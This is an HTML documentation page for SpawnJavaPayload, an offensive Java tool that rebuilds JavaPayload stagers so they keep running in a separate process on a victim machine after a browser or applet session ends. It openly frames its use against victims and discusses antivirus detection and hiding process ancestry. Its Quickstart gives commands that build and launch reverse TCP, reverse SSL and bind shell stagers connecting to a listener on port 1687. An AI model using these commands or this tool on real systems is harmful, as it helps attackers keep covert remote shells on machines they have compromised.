<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
<style type="text/css">
body { font-family: Verdana, Arial, sans-serif;  font-size: 10pt;}
p {margin-left: 2em; margin-right: 2em;}
</style>
<title>SpawnJavaPayload - Run Java Stager Payloads in a separate process</title>
</head>
<body>
<h1>SpawnJavaPayload - Run Java Stager Payloads in a separate process</h1>

<p><i>&copy; 2010 Michael 'mihi' Schierl, <tt>&lt;schierlm at users dot sourceforge dot net&gt;</tt></i></p>

<p><a href="SpawnJavaPayload-0.1.zip">Download SpawnJavaPayload-0.1.zip</a> (both source and compiled classes, 19 KB)</p>

<p>Based on/Requires <a href="http://schierlm.users.sourceforge.net/JavaPayload/">JavaPayload 0.2</a></p>

<h2>Introduction</h2>

<p>The <a href="http://schierlm.users.sourceforge.net/JavaPayload/">JavaPayload</a>s contain useful 
payloads written in pure Java. But there is one drawback when using them: Often Java is embedded into
other systems (like web browsers), and when the user stops using your web site, your payload will be
killed.</p>

<p>Therefore, this archive provides a general framework to dynamically create stagers that will not
run inside the victim process, but spawn a new process and run inside that one. This won't work for
some stagers, like <tt>JDWPTunnel</tt>, that depend on some external state of the process they are
loaded into, but any other stager that can build standalone class files can be used.</p>

<p>There is one drawback as well: As the new process will have to load the class from disk, your stager
will be dumped to disk (and deleted later), which may increase the risk of antivirus detection. On the
other hand, in the main usage scenario for these stagers - Java applets - the applet has been stored to
disk anyway (in the browser cache and/or the Java plugin cache).</p>

<h2>System requirements</h2>

<p>Same as JavaPayload. JRE 1.2 on the victim machine is enough <tt>:-)</tt></p>

<h2>Quickstart</h2>

<p>To use SpawnJavaPayload, you will have to have the same libraries on the classpath as you need for
JavaPayload, including ASM and JavaPayload.jar, and additionally you have to add SpawnJavaPayload.jar.</p>

<p>Next, you have to create new stagers for all the stagers you want to "convert". To convert all the
standard stagers shipped with JavaPayload 0.2, you can use this command:</p>

<p><tt>java javapayload.builder.SpawnStagerBuilder ReverseTCP ReverseSSL BindTCP BindMultiTCP</tt></p>

<p>This will create a file called <tt>SpawnStagers.jar</tt> that contains new stagers whose names start
with <tt>Spawn</tt>, like <tt>SpawnBindTCP</tt>. After adding them to the class path, they can be used
like any other stagers, for example:</p>

<p><tt>java javapayload.handler.stager.StagerHandler SpawnReverseTCP localhost # -- JSh</tt></p>
<p><tt>java javapayload.loader.StandaloneLoader SpawnReverseTCP localhost 1687 -- JSh</tt></p>

<p>You can even use these spawn stagers and create stagers from them that spawn once more. This can be
useful on systems (like Windows) where the parent process information is lost when the parent process
dies. Spawning twice will create a process that is not related to any other process.</p>

<p><tt>copy SpawnStagers.jar SpawnStagers2.jar</tt></p>
<p><tt>set CLASSPATH=SpawnStagers2.jar;%CLASSPATH%</tt></p>
<p><tt>java javapayload.builder.SpawnStagerBuilder SpawnReverseTCP SpawnReverseSSL SpawnBindTCP SpawnBindMultiTCP</tt></p>
<p><tt>java javapayload.handler.stager.StagerHandler SpawnSpawnReverseTCP localhost # -- JSh</tt></p>
<p><tt>java javapayload.loader.StandaloneLoader SpawnSpawnReverseTCP localhost 1687 -- JSh</tt></p>
</body>
</html>